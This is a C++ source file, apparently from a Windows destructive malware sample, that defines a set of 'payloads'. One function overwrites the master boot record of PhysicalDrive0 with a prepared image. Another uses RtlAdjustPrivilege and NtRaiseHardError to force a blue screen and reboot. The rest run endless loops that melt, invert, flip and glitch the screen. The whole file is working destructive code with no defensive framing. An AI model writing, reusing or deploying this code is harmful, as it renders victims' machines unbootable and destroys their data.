#include "stdafx.h"
#include "Payloads.h"
#include "Utils.h"


namespace Payloads {

	void Payloads::mbr() {

		DWORD dw;
		LPCWSTR p = L"C:\\WinWOW32\\mbr.bin";
		HANDLE d = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		HANDLE b = CreateFile(p, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		DWORD s = GetFileSize(b, 0);
		BYTE *m = new BYTE[s];
		ReadFile(b, m, s, &dw, 0);
		WriteFile(d, m, s, &dw, 0);
		CloseHandle(d);
	}

	void Payloads::forcebsod() {

		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {

			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
	}

	void Payloads::ChangeAllText() {

		while (true) {

			hdcs

			EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

			Sleep(25);
		}
	}

	void Payloads::ShowAllWindows() {

		hdcs

		EnumChildWindows(GetDesktopWindow(), &EnumChildProc2, NULL);

	}

	void Payloads::FlipScreen() {

		while (true) {

			hdcs

			StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, SRCCOPY);

			Sleep(3000);

		}
	}

	void Payloads::InvertScreen() {

		while (true) {

			hdcs

			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, invert);

			Sleep(3000);

		}
	}

	float fl(float x) {
		__asm {
			fld x
			fsin
		}
	}

	void Payloads::MeltScreen() {

		while (true) {

			hdcs

		        int xSize = 20;
			int ySize = 20;
			int power = 1;
			int distance = 1;

			if (xSize >= w) xSize = w - 1;
			if (ySize >= h) ySize = h - 1;

			HBITMAP screenshot = CreateCompatibleBitmap(hdc, xSize, w);
			SelectObject(hdc2, screenshot);

			for (int i = 0; i < power; i++) {
				int x = rand() % w - xSize / 2;
				for (; x % distance != 0; x++) {}

				BitBlt(hdc2, 0, 0, xSize, h, hdc, x, 0, SRCCOPY);

				for (int j = 0; j < xSize; j++) {
					int depth = fl(j / ((float)xSize)*3.14159)*(ySize);
					StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
					BitBlt(hdc2, j, 0, 1, h, hdc2, j, -depth, SRCCOPY);
				}

				BitBlt(hdc, x, 0, xSize, h, hdc2, 0, 0, SRCCOPY);
			}

			DeleteDC(hdc);
			DeleteDC(hdc2);
			DeleteObject(screenshot);

			Sleep(125);

		}
	}

	void Payloads::MoveScreen() {

		while (true) {

			hdcs

			BitBlt(hdc, 25, 25, w, h, hdc, 0, 0, SRCCOPY);

			Sleep(3000);

		}
	}

	void Payloads::ScreenGlitches() {

		while (true) {

			hdcs

			BitBlt(hdc, rand() % (w - 400), rand() % (h - 400), rand() % 400, rand() % 400, hdc, rand() % (w - 400), rand() % (h - 400), SRCCOPY);

			Sleep(1000);
		}
	}

	void Payloads::DrawIcons() {


		while (true) {

			hdcs

			DrawIcon(hdc, GET_X_LPARAM(c.x) - ix, GET_X_LPARAM(c.y) - iy, LoadIcon(NULL, (IDI_ASTERISK)));

			Sleep(25);
		}
	}

	void Payloads::RandomIcons() {

		while (true) {

			hdcs

			DrawIcon(hdc, rand() % (w - ix), rand() % (h - iy), LoadIcon(NULL, IDI_WARNING));

			Sleep(500);
		}
	}

	void Payloads::MoveDown() {

		while (true) {

			hdcs

	                if (xPower >= w) xPower = w - 1;
			if (yPower >= h) yPower = h - 1;

			HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
			SelectObject(hdc2, screenshot);

			BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
			BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, SRCCOPY);
			BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, SRCCOPY);
			BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, SRCCOPY);

			DeleteDC(hdc);
			DeleteDC(hdc2);
			DeleteObject(screenshot);

			Sleep(1000);
		}
	}

	void Payloads::FastTunnel() {

		while (true) {

			hdcs

			StretchBlt(hdc, 1, 10, w - 5, h - 1, hdc, 0, 0, w, h, SRCCOPY);

			Sleep(25);
		}
	}
};
